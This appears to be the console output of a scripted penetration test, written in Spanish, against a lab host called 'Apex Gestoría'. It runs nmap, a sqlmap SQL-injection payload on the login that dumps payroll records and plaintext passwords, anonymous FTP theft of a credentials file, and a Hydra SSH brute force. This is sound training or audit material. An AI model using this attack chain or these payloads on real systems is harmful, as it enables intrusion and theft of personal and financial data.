############ AUDITORÍA APEX GESTORÍA — 2026-06-01 17:44:32 ############

==================== FASE 1: RECONOCIMIENTO (nmap) ====================
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-01 17:44 UTC
Nmap scan report for 172.20.17.230
Host is up (0.0013s latency).
Not shown: 9995 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     vsftpd 3.0.5
22/tcp   open   ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open   http    Apache httpd 2.4.67 ((Debian))
443/tcp  closed https
2222/tcp open   ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.71 seconds

==================== FASE 2: AUDITORÍA WEB ====================
--- whatweb ---
[1m[34mhttp://172.20.17.230/[0m [200 OK] [1mApache[0m[[1m[32m2.4.67[0m], [1mCountry[0m[[0m[22mRESERVED[0m][[1m[31mZZ[0m], [1mHTML5[0m, [1mHTTPServer[0m[[1m[31mDebian Linux[0m][[1m[36mApache/2.4.67 (Debian)[0m], [1mIP[0m[[0m[22m172.20.17.230[0m], [1mTitle[0m[[1m[33mApex Gestoría[0m]
--- nikto (resumen) ---
/home/jamsec/audit-apex.sh: line 22: nikto: command not found
--- SQL injection (sqlmap: enumerar y volcar BBDD a través del login) ---
    Title: Generic UNION query (NULL) - 4 columns
    Payload: usuario=admin%' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x4a4841634f636e66646f6d5061796146654f4c687661515647585a7a4957494850526c48656c4d56,0x71706b6a71),NULL,NULL-- -&password=x
---
do you want to exploit this SQL injection? [Y/n] Y
[17:45:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP, Apache 2.4.67
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[17:45:22] [INFO] fetching database names
available databases [2]:
[*] apexgestoria
[*] information_schema

[17:45:22] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 60 times
[17:45:22] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/jamsec/.local/share/sqlmap/output/results-06012026_0545pm.csv'
[17:45:22] [WARNING] your sqlmap version is outdated

[*] ending @ 17:45:22 /2026-06-01/

--- sqlmap: volcar tabla clientes y nominas de apexgestoria ---
Database: apexgestoria
Table: nominas
[2 entries]
+----+-----------+--------------------------+-------------------+---------------+
| id | dni       | iban                     | empleado          | salario_bruto |
+----+-----------+--------------------------+-------------------+---------------+
| 1  | 39123456A | ES1000492352082414205416 | Joan Morales Pi   | 2450.00       |
| 2  | 39654321B | ES8021000813610123456789 | Marta Soler Vidal | 2780.50       |
+----+-----------+--------------------------+-------------------+---------------+

[17:45:23] [INFO] table 'apexgestoria.nominas' dumped to CSV file '/home/jamsec/.local/share/sqlmap/output/172.20.17.230/dump/apexgestoria/nominas.csv'
[17:45:23] [INFO] fetching columns for table 'usuarios' in database 'apexgestoria'
[17:45:23] [INFO] fetching entries for table 'usuarios' in database 'apexgestoria'
Database: apexgestoria
Table: usuarios
[3 entries]
+----+----------+----------+--------------+
| id | rol      | usuario  | password     |
+----+----------+----------+--------------+
| 1  | admin    | admin    | Apex.2026!   |
| 2  | contable | jmorales | gestoria2024 |
| 3  | soporte  | soporte  | soporte123   |
+----+----------+----------+--------------+

[17:45:23] [INFO] table 'apexgestoria.usuarios' dumped to CSV file '/home/jamsec/.local/share/sqlmap/output/172.20.17.230/dump/apexgestoria/usuarios.csv'
[17:45:23] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/jamsec/.local/share/sqlmap/output/results-06012026_0545pm.csv'
[17:45:23] [WARNING] your sqlmap version is outdated

[*] ending @ 17:45:23 /2026-06-01/


==================== FASE 3: FTP ANÓNIMO ====================
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
229 Entering Extended Passive Mode (|||30040|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             223 Jun 01 15:27 backup_apexgestoria.sql
-rw-r--r--    1 0        0             271 Jun 01 15:27 credencials.txt
drwxrwxrwx    2 103      105          4096 Jun 01 15:28 incoming
226 Directory send OK.
local: /home/jamsec/auditoria/ftp-credencials.txt remote: credencials.txt
229 Entering Extended Passive Mode (|||30052|)
150 Opening BINARY mode data connection for credencials.txt (271 bytes).
226 Transfer complete.
271 bytes received in 00:00 (156.68 KiB/s)
local: /home/jamsec/auditoria/ftp-backup.sql remote: backup_apexgestoria.sql
229 Entering Extended Passive Mode (|||30060|)
150 Opening BINARY mode data connection for backup_apexgestoria.sql (223 bytes).
226 Transfer complete.
223 bytes received in 00:00 (171.20 KiB/s)
221 Goodbye.
--- contenido robado por FTP ---
APEX GESTORIA - credencials internes (NO esborrar)
--------------------------------------------------
BBDD MariaDB 10.30.10.10:  root / toor
App web:                   apexweb / apexweb
Router/FW:                 admin / admin
WiFi oficina:              ApexGestoria2024

==================== FASE 4: FUERZA BRUTA SSH (puerto 2222) ====================
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-01 17:45:24
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:1/p:8), ~2 tries per task
[DATA] attacking ssh://172.20.17.230:2222/
[2222][ssh] host: 172.20.17.230   login: soporte   password: soporte123
[STATUS] attack finished for 172.20.17.230 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-01 17:45:29

############ AUDITORÍA FINALIZADA — 2026-06-01 17:45:29 ############
Evidencias en /home/jamsec/auditoria
total 56
drwxr-xr-x 2 jamsec jamsec 4096 Jun  1 17:45 .
drwxr-xr-x 5 jamsec jamsec 4096 Jun  1 17:45 ..
-rw-rw-r-- 1 jamsec jamsec  797 Jun  1 17:45 01-nmap-servicios.txt
-rw-rw-r-- 1 jamsec jamsec   62 Jun  1 17:45 02-nikto.txt
-rw-rw-r-- 1 jamsec jamsec  320 Jun  1 17:45 02-whatweb.txt
-rw-rw-r-- 1 jamsec jamsec 7846 Jun  1 17:45 03-sqlmap-dbs.txt
-rw-rw-r-- 1 jamsec jamsec 5151 Jun  1 17:45 04-sqlmap-dump.txt
-rw-rw-r-- 1 jamsec jamsec 1003 Jun  1 17:45 05-ftp.txt
-rw-rw-r-- 1 jamsec jamsec  706 Jun  1 17:45 06-hydra-ssh.txt
-rw-rw-r-- 1 jamsec jamsec  223 Jun  1 15:27 ftp-backup.sql
-rw-rw-r-- 1 jamsec jamsec  271 Jun  1 15:27 ftp-credencials.txt
-rw-rw-r-- 1 jamsec jamsec   56 Jun  1 17:45 wordlist.txt
